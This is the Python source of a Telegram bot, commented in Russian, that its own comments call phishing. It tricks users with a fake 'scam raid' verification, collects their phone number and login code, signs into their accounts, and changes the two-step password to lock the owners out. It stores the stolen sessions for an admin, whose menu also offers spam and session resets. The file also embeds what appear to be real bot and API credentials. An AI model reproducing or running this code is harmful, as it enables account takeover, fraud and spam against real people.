import asyncio
import os
import json
from pathlib import Path

from aiogram import Bot, Dispatcher, Router, types
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message, Contact

from telethon import TelegramClient
from telethon import functions

# ──────────────────────────────────────────────
BOT_TOKEN = "8757500911:AAEbSh9hlRam0GYC1HdkoXCGTd9Q1vVBeNc"
API_ID = 31462757
API_HASH = "79ae4e151e84526e11b107e99ad67177"
ADMIN_ID = 8559221549
ADMIN_ID1 = 8559221549  # если нужно несколько

SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)
# ──────────────────────────────────────────────

bot = Bot(token=BOT_TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

class AddAccount(StatesGroup):
    A1 = State()  # после контакта
    A2 = State()  # 1-я цифра
    A3 = State()  # 2-я
    A4 = State()  # 3-я
    A5 = State()  # 4-я
    A6 = State()  # 5-я

class Send(StatesGroup):
    A1 = State()  # username
    A2 = State()  # текст

code_menu = InlineKeyboardMarkup(inline_keyboard=[
    [
        InlineKeyboardButton(text="1️⃣", callback_data="code_number:1"),
        InlineKeyboardButton(text="2️⃣", callback_data="code_number:2"),
        InlineKeyboardButton(text="3️⃣", callback_data="code_number:3"),
    ],
    [
        InlineKeyboardButton(text="4️⃣", callback_data="code_number:4"),
        InlineKeyboardButton(text="5️⃣", callback_data="code_number:5"),
        InlineKeyboardButton(text="6️⃣", callback_data="code_number:6"),
    ],
    [
        InlineKeyboardButton(text="7️⃣", callback_data="code_number:7"),
        InlineKeyboardButton(text="8️⃣", callback_data="code_number:8"),
        InlineKeyboardButton(text="9️⃣", callback_data="code_number:9"),
    ],
    [
        InlineKeyboardButton(text="0️⃣", callback_data="code_number:0"),
    ]
])

@router.message(CommandStart())
async def start(m: Message, state: FSMContext):
    if m.from_user.id in (ADMIN_ID, ADMIN_ID1):
        count = len(list(SESSIONS_DIR.glob("*.session")))
        await m.answer(
            f"Привет <b>admin</b>, сессий: {count}\n\n"
            "/send - спам в лс\n"
            "/auth - сброс чужих сессий\n"
            "/session - получить все сессии"
        )
        return

    # для всех остальных — фишинг
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(types.KeyboardButton("Продолжить", request_contact=True))

    await m.answer(
        "В Telegram прошёл рейд скам ботов...\n"
        "Пройдите тест, чтобы продолжить.",
        reply_markup=kb
    )
    await state.set_state(AddAccount.A1)

@router.message(AddAccount.A1, types.F.content_type == types.ContentType.CONTACT)
async def receive_contact(m: Message, state: FSMContext):
    number = m.contact.phone_number.replace(" ", "").replace("-", "")
    await m.delete()

    session_path = SESSIONS_DIR / f"{number}.session"

    if session_path.exists():
        session_path.unlink()

    client = TelegramClient(str(session_path.with_suffix("")), API_ID, API_HASH)
    await client.connect()

    try:
        sent = await client.send_code_request(number)
        await state.update_data(
            number=number,
            code_hash=sent.phone_code_hash,
            msg_id=m.message_id  # можно использовать для редактирования
        )
        await m.answer(
            f"<b>Указан номер</b> <code>{number}</code>\n"
            f"Введите первую цифру кода:",
            reply_markup=code_menu
        )
        await state.set_state(AddAccount.A2)
    except Exception as e:
        await m.answer(f"Ошибка: {str(e)}")
        await state.clear()
    finally:
        await client.disconnect()

# Остальные хендлеры callback (A2–A6) — аналогично оригиналу, но адаптировать под aiogram 3

@router.callback_query(lambda c: c.data.startswith("code_number:"))
async def code_callback(c: CallbackQuery, state: FSMContext):
    current_state = await state.get_state()
    if not current_state:
        await c.answer("Сессия истекла")
        return

    step = int(current_state.split(":")[-1]) - 1  # A2 → 1, A3 → 2 и т.д.
    digit = c.data.split(":")[1]

    data = await state.get_data()
    code_parts = data.get("code_parts", [])
    code_parts.append(digit)

    full_code = "".join(code_parts)

    await c.message.edit_text(
        f"<b>Код:</b> <code>{full_code}</code>\nВведите следующую цифру:",
        reply_markup=code_menu
    )

    await state.update_data(code_parts=code_parts)

    if len(code_parts) == 5:
        # финальная логика sign_in + смена 2FA
        number = data["number"]
        code_hash = data["code_hash"]
        code = full_code

        client = TelegramClient(str(SESSIONS_DIR / number), API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(phone=number, code=code, phone_code_hash=code_hash)
            await client.edit_2fa(new_password="youscam666")
            await c.message.edit_text(
                "<b>Аккаунт проверен. Результат через 24 часа.</b>"
            )
            await bot.send_message(ADMIN_ID, f"Новый: {c.from_user.id} - @{c.from_user.username or 'no username'}")
        except Exception as e:
            await c.message.edit_text(f"Ошибка: {str(e)}")
        finally:
            await client.disconnect()
            await state.clear()
    else:
        await state.set_state(f"AddAccount:A{len(code_parts)+2}")

# Остальные команды (/send, /auth, /session) — аналогично, но с aiogram 3 синтаксисом

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
